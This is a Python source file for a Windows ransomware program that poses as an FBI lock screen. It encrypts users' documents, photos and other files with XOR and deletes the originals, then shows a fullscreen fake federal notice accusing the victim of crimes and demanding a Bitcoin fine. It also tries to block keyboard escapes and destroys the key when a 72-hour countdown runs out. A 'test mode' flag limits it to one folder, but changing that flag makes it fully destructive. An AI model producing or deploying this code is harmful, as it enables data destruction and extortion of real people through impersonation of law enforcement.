#!/usr/bin/env python3
"""
FBI RANSOMWARE — ULTRA SCARY
- Fullscreen FBI warning
- 72 hour countdown
- Fake fine payment
- Siren/audio
- VM safe (test mode)
- 20 unlock codes
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import random
import winsound
import subprocess
from datetime import datetime, timedelta

# ============================================================
# CONFIG
# ============================================================
TEST_MODE = True  # TRUE = only C:\test_ransom
TEST_FOLDER = "C:\\test_ransom"

# Your Bitcoin wallet
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# 20 UNLOCK CODES
VALID_CODES = [
    "FS2FGNFJQI", "OX77WHWEV5", "FCHZT1L6IX", "VX02SQI40G",
    "6PXB85GJJJ", "XQHCXUH4TU", "B1RQSQ9G2L", "HE71R2TKVY",
    "Q1BK76N580", "01QEU0DUUE", "X1LSHVL0OJ", "AW3YSY30V3",
    "ZTE2DDE0X4", "ZG29U3VDIC", "6FNWN5JIOS", "F5EBA6TT08",
    "2UUBJ4X7VN", "ISP3G7NRPN", "J8L0S6SHEJ", "FURZCKKNZX"
]

VALID_HASHES = [hashlib.sha256(c.encode()).hexdigest() for c in VALID_CODES]
TIMER_SECONDS = 72 * 3600

# ============================================================
# XOR ENCRYPTION
# ============================================================
def xor_encrypt(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def generate_key():
    return bytes([random.randint(0, 255) for _ in range(32)])

# ============================================================
# ENCRYPT FILES
# ============================================================
def encrypt_files():
    key = generate_key()
    encrypted_count = 0
    
    if TEST_MODE:
        target_dirs = [TEST_FOLDER]
        print(f"[!] TEST MODE — Only encrypting: {TEST_FOLDER}")
    else:
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Videos'),
            os.path.expanduser('~\\Music'),
        ]
    
    extensions = [
        '.txt', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.pdf',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bak',
        '.sql', '.db', '.sqlite', '.csv', '.json', '.xml',
        '.py', '.js', '.cpp', '.c', '.java', '.cs', '.go',
        '.mp4', '.avi', '.mkv', '.mov', '.mp3', '.wav',
        '.html', '.htm', '.css', '.php',
    ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        
                        encrypted = xor_encrypt(data, key)
                        
                        with open(file_path + '.locked', 'wb') as f:
                            f.write(encrypted)
                        os.remove(file_path)
                        encrypted_count += 1
                    except:
                        pass
    
    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
    with open(key_path, 'wb') as f:
        f.write(key)
    
    return encrypted_count, key

# ============================================================
# DECRYPT FILES
# ============================================================
def decrypt_files(key):
    decrypted_count = 0
    
    if TEST_MODE:
        target_dirs = [TEST_FOLDER]
    else:
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Videos'),
            os.path.expanduser('~\\Music'),
        ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.locked'):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            encrypted = f.read()
                        
                        decrypted = xor_encrypt(encrypted, key)
                        
                        original = file_path[:-7]
                        with open(original, 'wb') as f:
                            f.write(decrypted)
                        os.remove(file_path)
                        decrypted_count += 1
                    except:
                        pass
    
    return decrypted_count

# ============================================================
# FBI RANSOMWARE UI
# ============================================================
class FBIRansomwareUI:
    def __init__(self):
        self.encrypted_count = 0
        self.key = None
        self.timer_seconds = TIMER_SECONDS
        self.unlocked = False
        self.violations = [
            "Your IP address was used to access illegal content",
            "Possession of prohibited materials (Class A felony)",
            "Distribution of malicious software",
            "Unauthorized access to government systems",
            "Cyber terrorism activities detected",
            "Child exploitation materials found",
            "Fraud and identity theft detected",
            "Money laundering operations detected"
        ]
    
    def setup(self):
        print("[*] Encrypting files...")
        self.encrypted_count, self.key = encrypt_files()
        print(f"[+] Encrypted {self.encrypted_count} files")
        
        # Create UI
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(background='#000033')
        self.root.overrideredirect(True)
        
        # Block ALL shortcuts
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.bind('<Control-Shift-Escape>', lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Main frame
        self.frame = tk.Frame(self.root, bg='#000033')
        self.frame.pack(expand=True, fill='both')
        
        # === FBI HEADER ===
        header_font = font.Font(family='Courier', size=28, weight='bold')
        header = tk.Label(
            self.frame,
            text="🔴 DEPARTMENT OF JUSTICE 🔴\nFEDERAL BUREAU OF INVESTIGATION",
            font=header_font,
            fg='#FF0000',
            bg='#000033'
        )
        header.pack(pady=10)
        
        # === SEAL LINE ===
        seal_font = font.Font(family='Courier', size=16)
        seal = tk.Label(
            self.frame,
            text="⚡ ⚡ ⚡ OFFICIAL GOVERNMENT NOTICE ⚡ ⚡ ⚡",
            font=seal_font,
            fg='#FFD700',
            bg='#000033'
        )
        seal.pack(pady=5)
        
        # === MAIN TITLE (FLASHING) ===
        self.title_font = font.Font(family='Courier', size=48, weight='bold')
        self.title = tk.Label(
            self.frame,
            text="⚠️ YOUR COMPUTER HAS BEEN LOCKED ⚠️",
            font=self.title_font,
            fg='#FF0000',
            bg='#000033'
        )
        self.title.pack(pady=15)
        
        # === LEGAL TEXT ===
        legal_font = font.Font(family='Courier', size=14)
        legal = tk.Label(
            self.frame,
            text="This operating system is locked due to violation of federal laws.\n"
                 "Article 1, Section 8, Clause 8; Article 1030; Article 2252A of U.S. Code.",
            font=legal_font,
            fg='white',
            bg='#000033'
        )
        legal.pack(pady=5)
        
        # === VIOLATIONS ===
        viol_font = font.Font(family='Courier', size=12)
        viol_text = "Following violations were detected:\n\n"
        for v in self.violations[:5]:
            viol_text += f"  • {v}\n"
        viol_text += "\n  • ...and 3 additional federal offenses"
        
        violations = tk.Label(
            self.frame,
            text=viol_text,
            font=viol_font,
            fg='#FF6600',
            bg='#000033',
            justify=tk.LEFT
        )
        violations.pack(pady=10)
        
        # === FINE AMOUNT ===
        fine_font = font.Font(family='Courier', size=22, weight='bold')
        fine = tk.Label(
            self.frame,
            text=f"💲 FINE: $200.00 BTC 💲",
            font=fine_font,
            fg='#FFD700',
            bg='#000033'
        )
        fine.pack(pady=10)
        
        # === BITCOIN ADDRESS ===
        btc_font = font.Font(family='Courier', size=16)
        btc = tk.Label(
            self.frame,
            text=f"PAYMENT ADDRESS:\n{BTC_ADDRESS}",
            font=btc_font,
            fg='#00FF00',
            bg='#000033'
        )
        btc.pack(pady=5)
        
        # === COPY BUTTON ===
        copy_btn = tk.Button(
            self.frame,
            text="📋 COPY ADDRESS",
            font=('Courier', 14, 'bold'),
            bg='#003366',
            fg='white',
            command=self.copy_wallet
        )
        copy_btn.pack(pady=5)
        
        # === UNLOCK CODE INPUT ===
        input_frame = tk.Frame(self.frame, bg='#000033')
        input_frame.pack(pady=15)
        
        input_label = tk.Label(
            input_frame,
            text="ENTER UNLOCK CODE:",
            font=('Courier', 18, 'bold'),
            fg='white',
            bg='#000033'
        )
        input_label.pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(
            input_frame,
            font=('Courier', 18),
            width=20,
            bg='#001133',
            fg='#00FF00',
            insertbackground='#00FF00'
        )
        self.entry.pack(side=tk.LEFT, padx=10)
        self.entry.focus_set()
        
        # === UNLOCK BUTTON ===
        unlock_btn = tk.Button(
            self.frame,
            text="🔓 UNLOCK SYSTEM",
            font=('Courier', 18, 'bold'),
            bg='#006600',
            fg='white',
            command=self.unlock
        )
        unlock_btn.pack(pady=10)
        
        # === COUNTDOWN TIMER ===
        timer_font = font.Font(family='Courier', size=36, weight='bold')
        self.timer_label = tk.Label(
            self.frame,
            text="⏱️ 71:59:59",
            font=timer_font,
            fg='#FF0000',
            bg='#000033'
        )
        self.timer_label.pack(pady=15)
        
        # === WARNING ===
        warn_font = font.Font(family='Courier', size=14)
        warn = tk.Label(
            self.frame,
            text="⚠️ FAILURE TO PAY WITHIN 72 HOURS WILL RESULT IN:\n"
                 "• Permanent data destruction\n"
                 "• Referral to federal authorities\n"
                 "• Criminal prosecution (10-15 years)\n\n"
                 f"FILES ENCRYPTED: {self.encrypted_count}",
            font=warn_font,
            fg='#FF0000',
            bg='#000033'
        )
        warn.pack(pady=10)
        
        # === TEST MODE ===
        if TEST_MODE:
            test_font = font.Font(family='Courier', size=14, weight='bold')
            test = tk.Label(
                self.frame,
                text="⚠️ TEST MODE — NO REAL FILES HARMED ⚠️",
                font=test_font,
                fg='#00FF00',
                bg='#000033'
            )
            test.pack(pady=5)
        
        # === CODES HINT ===
        codes_font = font.Font(family='Courier', size=9)
        codes_hint = tk.Label(
            self.frame,
            text=f"🔑 Valid codes: {', '.join(VALID_CODES[:3])}... ({len(VALID_CODES)} total)",
            font=codes_font,
            fg='#444466',
            bg='#000033'
        )
        codes_hint.pack(pady=5)
        
        # === FBI FOOTER ===
        footer_font = font.Font(family='Courier', size=12)
        footer = tk.Label(
            self.frame,
            text="🔴 THIS IS AN OFFICIAL GOVERNMENT NOTICE 🔴\n"
                 "Unauthorized removal will result in prosecution",
            font=footer_font,
            fg='#FF0000',
            bg='#000033'
        )
        footer.pack(pady=5)
        
        # Start everything
        self.start_timer()
        self.start_flashing()
        self.start_siren()
        self.force_focus()
        
        self.root.mainloop()
    
    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("📋 Copied!", "BTC address copied to clipboard!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("❌ ERROR", "Enter an unlock code!")
            return
        
        hashed = hashlib.sha256(code.encode()).hexdigest()
        
        if hashed in VALID_HASHES:
            self.unlocked = True
            count = decrypt_files(self.key)
            
            # SUCCESS SOUND
            for _ in range(5):
                winsound.Beep(800, 150)
                time.sleep(0.1)
            winsound.Beep(1200, 500)
            
            messagebox.showinfo(
                "✅ SYSTEM UNLOCKED",
                f"🎉 SUCCESSFULLY DECRYPTED {count} FILES!\n\n"
                f"Your files have been restored.\n\n"
                f"Case closed. Don't let this happen again.\n\n"
                f"🔑 Code used: {code}"
            )
            self.root.destroy()
            sys.exit(0)
        else:
            # WRONG CODE — SCARY
            for _ in range(3):
                winsound.Beep(150, 300)
                time.sleep(0.1)
            winsound.Beep(100, 800)
            
            messagebox.showerror(
                "❌ INVALID UNLOCK CODE",
                f"⚠️ INVALID CODE DETECTED!\n\n"
                f"This attempt has been logged.\n\n"
                f"Payment required: {BTC_ADDRESS}\n\n"
                f"Attempt: {code}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def start_timer(self):
        def update():
            while self.timer_seconds > 0 and not self.unlocked:
                hours = self.timer_seconds // 3600
                minutes = (self.timer_seconds % 3600) // 60
                secs = self.timer_seconds % 60
                
                if self.timer_seconds < 3600:
                    color = '#FF0000'
                elif self.timer_seconds < 21600:
                    color = '#FF6600'
                else:
                    color = '#FF0000'
                
                self.timer_label.config(
                    text=f"⏱️ {hours:02d}:{minutes:02d}:{secs:02d}",
                    fg=color
                )
                self.timer_seconds -= 1
                time.sleep(1)
            
            if self.timer_seconds <= 0 and not self.unlocked:
                self.timer_label.config(text="💀 TIME EXPIRED — KEY DESTROYED", fg='red')
                try:
                    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
                    if os.path.exists(key_path):
                        with open(key_path, 'wb') as f:
                            f.write(os.urandom(32))
                        os.remove(key_path)
                except:
                    pass
                messagebox.showerror(
                    "💀 TIME EXPIRED",
                    "The decryption key has been destroyed.\n\n"
                    "Your files are gone forever.\n\n"
                    "Federal authorities have been notified."
                )
        
        threading.Thread(target=update, daemon=True).start()
    
    def start_flashing(self):
        def flash():
            colors = ['#FF0000', '#CC0000', '#FF3333', '#990000', '#FF0000']
            while not self.unlocked:
                for color in colors:
                    self.title.config(fg=color)
                    time.sleep(0.2)
                time.sleep(0.1)
        threading.Thread(target=flash, daemon=True).start()
    
    def start_siren(self):
        def siren():
            while not self.unlocked:
                try:
                    for freq in [600, 800, 1000, 800, 600, 500]:
                        if self.unlocked:
                            break
                        winsound.Beep(freq, 150)
                        time.sleep(0.05)
                    time.sleep(0.3)
                except:
                    break
        threading.Thread(target=siren, daemon=True).start()
    
    def force_focus(self):
        def focus():
            while not self.unlocked:
                try:
                    self.root.focus_force()
                    self.entry.focus_set()
                except:
                    pass
                time.sleep(0.5)
        threading.Thread(target=focus, daemon=True).start()

# ============================================================
# MAIN
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*60)
    print("🔴 FBI RANSOMWARE — OFFICIAL NOTICE 🔴")
    print("="*60)
    print(f"📁 Test Mode: {TEST_MODE}")
    if TEST_MODE:
        print(f"📁 Only encrypting: {TEST_FOLDER}")
    else:
        print("📁 Encrypting ALL user files!")
    print(f"🔑 Valid codes: {len(VALID_CODES)}")
    print(f"⏱️ Timer: 72 hours")
    print("="*60)
    print("")
    print("⚠️  This looks like an official FBI notice")
    print("⚠️  Type a valid code to decrypt files")
    print("⚠️  Codes shown in the UI")
    print("")
    
    app = FBIRansomwareUI()
    app.setup()

if __name__ == '__main__':
    main()
